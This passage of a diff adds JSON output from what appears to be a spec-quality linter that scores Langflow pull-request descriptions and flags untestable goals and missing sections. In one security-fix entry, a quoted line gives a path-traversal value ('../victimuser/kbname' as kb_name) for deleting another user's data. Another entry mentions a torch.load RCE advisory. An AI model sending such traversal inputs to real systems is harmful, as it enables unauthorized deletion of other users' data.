+            "suggestion": "Goal without test: 'Only affects users who explicitly install: \\pip install lang...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Used for document processing features via the docling integration",
+            "suggestion": "Goal without test: 'Used for document processing features via the docling integr...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "No direct usage of \\torch.load()\\ in Langflow codebase",
+            "suggestion": "Goal without test: 'No direct usage of \\torch.load()\\ in Langflow codebase' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "PyTorch is only a transitive dependency through \\langchain-docling\\",
+            "suggestion": "Goal without test: 'PyTorch is only a transitive dependency through \\langchain-d...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Optional feature, not installed by default",
+            "suggestion": "Goal without test: 'Optional feature, not installed by default' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Required to avoid dependency conflicts with PyTorch 2.6.0+",
+            "suggestion": "Goal without test: 'Required to avoid dependency conflicts with PyTorch 2.6.0+' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Version 0.4.4 pinned PyTorch to 2.2.2 (vulnerable)",
+            "suggestion": "Goal without test: 'Version 0.4.4 pinned PyTorch to 2.2.2 (vulnerable)' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Version 0.10.1 supports PyTorch 2.5.1+ (compatible with 2.6.0+)",
+            "suggestion": "Goal without test: 'Version 0.10.1 supports PyTorch 2.5.1+ (compatible with 2.6....' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Allows patch versions like 1.23.2 required by agent-lifecycle-toolkit 0.10.1",
+            "suggestion": "Goal without test: 'Allows patch versions like 1.23.2 required by agent-lifecycl...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Functionally equivalent but provides better compatibility",
+            "suggestion": "Goal without test: 'Functionally equivalent but provides better compatibility' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "PyTorch 2.6.0 Release Notes: https://github.com/pytorch/pytorch/releases/tag/v2.",
+            "suggestion": "Goal without test: 'PyTorch 2.6.0 Release Notes: https://github.com/pytorch/pyto...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Security Advisory: RCE in \\torch.load()\\ with \\weights_only=True\\",
+            "suggestion": "Goal without test: 'Security Advisory: RCE in \\torch.load()\\ with \\weights_only=...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12337,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 57,
+        "consistency": 100,
+        "overall": 59,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Fix applies Path.resolve() + isrelativeto() validation before any directory crea",
+            "suggestion": "Goal without test: 'Fix applies Path.resolve() + isrelativeto() validation befor...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Duplicated containment-check logic has been extracted into validatekbpathcontain",
+            "suggestion": "Goal without test: 'Duplicated containment-check logic has been extracted into v...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] testcreatekbpathtraversallogswarning \u2014 verifies logger.warning` is called on",
+            "suggestion": "Goal without test: '[ ] testcreatekbpathtraversallogswarning \u2014 verifies logger.w...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No state transitions \u2014 AI may allow invalid transitions",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12243,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 25,
+        "consistency": 100,
+        "overall": 51,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "An authenticated attacker could send ../victimuser/kbname as a kb_name to delete",
+            "suggestion": "Goal without test: 'An authenticated attacker could send ../victimuser/kbname as...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Fix uses Path.resolve() to normalize the path and validates it stays within the ",
+            "suggestion": "Goal without test: 'Fix uses Path.resolve() to normalize the path and validates ...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added testbulkdeletepathtraversal that creates a victim user's KB directory, sen",
+            "suggestion": "Goal without test: 'Added testbulkdeletepathtraversal that creates a victim user...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No state transitions \u2014 AI may allow invalid transitions",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12286,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Make TracingService.addlog() and setoutputs() gracefully handle missing componen",
+            "suggestion": "Goal without test: 'Make TracingService.addlog() and setoutputs() gracefully han...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add encoding fallback chain (detected \u2192 utf-8 \u2192 gb18030 \u2192 latin-1) in readtextfi",
+            "suggestion": "Goal without test: 'Add encoding fallback chain (detected \u2192 utf-8 \u2192 gb18030 \u2192 la...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Propagate ContextVars to ThreadPoolExecutor workers in parallelloaddata() via co",
+            "suggestion": "Goal without test: 'Propagate ContextVars to ThreadPoolExecutor workers in paral...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[x] Existing tracing service unit tests pass (17/17)",
+            "suggestion": "Goal without test: '[x] Existing tracing service unit tests pass (17/17)' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[x] Existing lfx data unit tests pass (48/48)",
+            "suggestion": "Goal without test: '[x] Existing lfx data unit tests pass (48/48)' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[x] New tests for addlog/setoutputs without component context",
+            "suggestion": "Goal without test: '[x] New tests for addlog/setoutputs without component contex...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[x] New tests for readtextfile encoding fallback (utf-8, Chinese chars, latin-1,",
+            "suggestion": "Goal without test: '[x] New tests for readtextfile encoding fallback (utf-8, Chi...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Manual test: upload .md file with Chinese characters through File component ",
+            "suggestion": "Goal without test: '[ ] Manual test: upload .md file with Chinese characters thr...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12264,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added windows-latest to runner options",
+            "suggestion": "Goal without test: 'Added windows-latest to runner options' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added shell: bash to all script steps for cross-platform compatibility",
+            "suggestion": "Goal without test: 'Added shell: bash to all script steps for cross-platform com...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Split Playwright installation into OS-aware steps:",
+            "suggestion": "Goal without test: 'Split Playwright installation into OS-aware steps:' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Linux: npx playwright install --with-deps chromium (includes system dependencies",
+            "suggestion": "Goal without test: 'Linux: npx playwright install --with-deps chromium (includes...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Windows/macOS/Self-hosted: npx playwright install chromium (no --with-deps flag)",
+            "suggestion": "Goal without test: 'Windows/macOS/Self-hosted: npx playwright install chromium (...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Fixed artifact naming with OS prefix: blob-report-${{ runner.os }}-${{ matrix.sh",
+            "suggestion": "Goal without test: 'Fixed artifact naming with OS prefix: blob-report-${{ runner...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Prevents 409 Conflict errors when Linux and Windows tests run in parallel",
+            "suggestion": "Goal without test: 'Prevents 409 Conflict errors when Linux and Windows tests ru...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Split frontend-tests into two separate jobs:",
+            "suggestion": "Goal without test: 'Split frontend-tests into two separate jobs:' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "frontend-tests-linux: Runs on ubuntu-latest (blocking)",
+            "suggestion": "Goal without test: 'frontend-tests-linux: Runs on ubuntu-latest (blocking)' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "frontend-tests-windows: Runs on windows-latest (non-blocking)",
+            "suggestion": "Goal without test: 'frontend-tests-windows: Runs on windows-latest (non-blocking...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added ref parameter to all test jobs to checkout code from release branch",
+            "suggestion": "Goal without test: 'Added ref parameter to all test jobs to checkout code from r...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added resolve-release-branch to job dependencies",
+            "suggestion": "Goal without test: 'Added resolve-release-branch to job dependencies' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Updated Slack notifications to report results from both platforms",
+            "suggestion": "Goal without test: 'Updated Slack notifications to report results from both plat...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "release-nightly-build only checks frontend-tests-linux.result",
+            "suggestion": "Goal without test: 'release-nightly-build only checks frontend-tests-linux.resul...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Windows failures are reported in Slack but don't block the build",
+            "suggestion": "Goal without test: 'Windows failures are reported in Slack but don't block the b...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Provides visibility into Windows-specific issues while we stabilize the tests",
+            "suggestion": "Goal without test: 'Provides visibility into Windows-specific issues while we st...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Updated line number reference (263 \u2192 347) for LANGFLOWENGSLACKWEBHOOKURL",
+            "suggestion": "Goal without test: 'Updated line number reference (263 \u2192 347) for LANGFLOWENGSLA...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "\u2705 Linux tests passed",
+            "suggestion": "Goal without test: '\u2705 Linux tests passed' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "\u26a0\ufe0f Windows tests failed (expected during stabilization, non-blocking by design)",
+            "suggestion": "Goal without test: '\u26a0\ufe0f Windows tests failed (expected during stabilization, non-...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "\u2705 Artifact naming conflicts resolved",
+            "suggestion": "Goal without test: '\u2705 Artifact naming conflicts resolved' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "\u2705 Build proceeded successfully despite Windows failures",
+            "suggestion": "Goal without test: '\u2705 Build proceeded successfully despite Windows failures' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "#12221 - Original implementation merged to release-1.9.0",
+            "suggestion": "Goal without test: '#12221 - Original implementation merged to release-1.9.0' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Extended frontend test suite to run on both Linux and Windows platforms for impr",
+            "suggestion": "Goal without test: 'Extended frontend test suite to run on both Linux and Window...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Updated CI/CD infrastructure to support multi-platform testing workflows and enh",
+            "suggestion": "Goal without test: 'Updated CI/CD infrastructure to support multi-platform testi...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12453,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "introduces GET /deployments/{deployment_id}/flows with page/size pagination",
+            "suggestion": "Goal without test: 'introduces GET /deployments/{deployment_id}/flows with page/...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "returns attachment-scoped metadata (flowversion id, flowid, versionnumber, attac",
+            "suggestion": "Goal without test: 'returns attachment-scoped metadata (flowversion id, flowid, ...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "keeps provider-owned fields under provider_data on each item",
+            "suggestion": "Goal without test: 'keeps provider-owned fields under provider_data on each item' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "loads deployment attachments from DB, extracts providersnapshotid values, and ve",
+            "suggestion": "Goal without test: 'loads deployment attachments from DB, extracts providersnaps...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "removes stale attachment rows when snapshot IDs no longer exist on the provider",
+            "suggestion": "Goal without test: 'removes stale attachment rows when snapshot IDs no longer ex...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "falls back to DB-only response without enrichment on any sync failure (including",
+            "suggestion": "Goal without test: 'falls back to DB-only response without enrichment on any syn...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "helper now passes through SnapshotListResult | None instead of pre-building enri",
+            "suggestion": "Goal without test: 'helper now passes through SnapshotListResult | None instead ...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "route delegates full response shaping to mapper.shapeflowversionlistresult(...)",
+            "suggestion": "Goal without test: 'route delegates full response shaping to mapper.shapeflowver...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "base mapper performs direct DB->API mapping for flow-version list items",
+            "suggestion": "Goal without test: 'base mapper performs direct DB->API mapping for flow-version...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "WXO mapper overrides list shaping to enrich providerdata with connectionapp_ids ",
+            "suggestion": "Goal without test: 'WXO mapper overrides list shaping to enrich providerdata wit...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "add extractlangflowconnections_binding(...) in core/tools.py",
+            "suggestion": "Goal without test: 'add extractlangflowconnections_binding(...) in core/tools.py' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "reuse it in verifytoolsby_ids and service config listing to avoid duplicated nes",
+            "suggestion": "Goal without test: 'reuse it in verifytoolsby_ids and service config listing to ...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "add CRUD helpers for paginated attachment+flow_version join and attachment count",
+            "suggestion": "Goal without test: 'add CRUD helpers for paginated attachment+flow_version join ...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "extend schema and route tests for new response models/endpoint behavior",
+            "suggestion": "Goal without test: 'extend schema and route tests for new response models/endpoi...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "add mapper tests for base direct mapping and WXO-specific enrichment",
+            "suggestion": "Goal without test: 'add mapper tests for base direct mapping and WXO-specific en...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "add sync tests for snapshot-id verification, stale-row cleanup, and fallback sem",
+            "suggestion": "Goal without test: 'add sync tests for snapshot-id verification, stale-row clean...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12448,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Removed mypy from CI -- it hasn't caught any issues in a long time, likely becau",
+            "suggestion": "Goal without test: 'Removed mypy from CI -- it hasn't caught any issues in a lon...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Removed mypy, all types-* stub packages, and [tool.mypy] config sections",
+            "suggestion": "Goal without test: 'Removed mypy, all types-* stub packages, and [tool.mypy] con...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "We evaluated [ty](https://github.com/astral-sh/ty) as a replacement but it's not",
+            "suggestion": "Goal without test: 'We evaluated [ty](https://github.com/astral-sh/ty) as a repl...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "make lint is a no-op for now until we have a viable type checker",
+            "suggestion": "Goal without test: 'make lint is a no-op for now until we have a viable type che...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No state transitions \u2014 AI may allow invalid transitions",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 11891,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 99,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 46,
+            "type": "ambiguity",
+            "term": "better",
+            "suggestion": "Replace 'better' with a specific, measurable term"
+          },
+          {
+            "line": 98,
+            "type": "ambiguity",
+            "term": "comprehensive",
+            "suggestion": "Replace 'comprehensive' with a specific, measurable term"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add end-to-end token usage tracking (input/output/total) for LLM and Agent compo",
+            "suggestion": "Goal without test: 'Add end-to-end token usage tracking (input/output/total) for...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Display token counts on node badges (with Coins icon and tooltip breakdown) and ",
+            "suggestion": "Goal without test: 'Display token counts on node badges (with Coins icon and too...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Introduce a thread-safe TokenUsageCallbackHandler that accumulates tokens across",
+            "suggestion": "Goal without test: 'Introduce a thread-safe TokenUsageCallbackHandler that accum...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Enable token usage in streaming mode for OpenAI and Anthropic via stream_usage=T",
+            "suggestion": "Goal without test: 'Enable token usage in streaming mode for OpenAI and Anthropi...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Accumulate serial LLM token usage on chat messages so the total reflects all ups",
+            "suggestion": "Goal without test: 'Accumulate serial LLM token usage on chat messages so the to...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "TokenUsageCallbackHandler \u2014 a new BaseCallbackHandler that accumulates tokens ac",
+            "suggestion": "Goal without test: 'TokenUsageCallbackHandler \u2014 a new BaseCallbackHandler that a...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "LCModelComponent.extractusage() \u2014 extended to check message.usagemetadata first ",
+            "suggestion": "Goal without test: 'LCModelComponent.extractusage() \u2014 extended to check message....' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Centralized token usage extraction into a shared token_usage schema module",
+            "suggestion": "Goal without test: 'Centralized token usage extraction into a shared token_usage...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "agent.py \u2014 wires TokenUsageCallbackHandler into agent execution callbacks, store",
+            "suggestion": "Goal without test: 'agent.py \u2014 wires TokenUsageCallbackHandler into agent execut...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "model.py \u2014 stores tokenusage on the component for both streaming and non-streami",
+            "suggestion": "Goal without test: 'model.py \u2014 stores tokenusage on the component for both strea...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "vertex/base.py \u2014 extracts tokenusage from custom component during finalize_build",
+            "suggestion": "Goal without test: 'vertex/base.py \u2014 extracts tokenusage from custom component d...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "schema.py / schemas.py \u2014 carries token_usage through ResultData \u2192 ResultDataResp",
+            "suggestion": "Goal without test: 'schema.py / schemas.py \u2014 carries token_usage through ResultD...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "chat_output.py \u2014 accumulates token usage from all upstream LLM vertices into the",
+            "suggestion": "Goal without test: 'chat_output.py \u2014 accumulates token usage from all upstream L...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "openaichatmodel.py \u2014 sets stream_usage=True on ChatOpenAI so the API includes to",
+            "suggestion": "Goal without test: 'openaichatmodel.py \u2014 sets stream_usage=True on ChatOpenAI so...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "anthropic.py \u2014 sets stream_usage=True explicitly on ChatAnthropic (was default, ",
+            "suggestion": "Goal without test: 'anthropic.py \u2014 sets stream_usage=True explicitly on ChatAnth...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "component.py \u2014 new accumulateusage() method handles providers that split usage a",
+            "suggestion": "Goal without test: 'component.py \u2014 new accumulateusage() method handles provider...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "UsageType added to PropertiesType in chat types",
+            "suggestion": "Goal without test: 'UsageType added to PropertiesType in chat types' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "token_usage added to VertexDataTypeAPI",
+            "suggestion": "Goal without test: 'token_usage added to VertexDataTypeAPI' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Duration badge shows Coins icon + token count + | + duration (e.g., \ud83e\ude99 2.5K | 3.2",
+            "suggestion": "Goal without test: 'Duration badge shows Coins icon + token count + | + duration...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Tooltip shows input/output token breakdown with Coins icons",
+            "suggestion": "Goal without test: 'Tooltip shows input/output token breakdown with Coins icons' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Dark tooltip background for better contrast",
+            "suggestion": "Goal without test: 'Dark tooltip background for better contrast' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Status header shows Finished on the left, \ud83e\ude99 2.5K | 3.2s on the right",
+            "suggestion": "Goal without test: 'Status header shows Finished on the left, \ud83e\ude99 2.5K | 3.2s on t...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Token display uses font-mono text-accent-emerald-foreground styling",
+            "suggestion": "Goal without test: 'Token display uses font-mono text-accent-emerald-foreground ...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Backend: cd src/lfx && uv sync && uv run pytest tests/unit/base/agents/testt",
+            "suggestion": "Goal without test: '[ ] Backend: cd src/lfx && uv sync && uv run pytest tests/un...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Frontend: cd src/frontend && npx vitest run src/utils/tests/format-token-cou",
+            "suggestion": "Goal without test: '[ ] Frontend: cd src/frontend && npx vitest run src/utils/te...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Create a flow: Chat Input \u2192 OpenAI \u2192 Chat Output",
+            "suggestion": "Goal without test: '[ ] Create a flow: Chat Input \u2192 OpenAI \u2192 Chat Output' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Disable streaming on the OpenAI component",
+            "suggestion": "Goal without test: '[ ] Disable streaming on the OpenAI component' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Run the flow \u2014 verify node badge shows \ud83e\ude99 <count> | <time> and tooltip shows ",
+            "suggestion": "Goal without test: '[ ] Run the flow \u2014 verify node badge shows \ud83e\ude99 <count> | <time...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Verify chat message shows Finished on the left, \ud83e\ude99 <count> | <time> on the ri",
+            "suggestion": "Goal without test: '[ ] Verify chat message shows Finished on the left, \ud83e\ude99 <count...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Same flow with streaming enabled \u2014 verify same token display behavior",
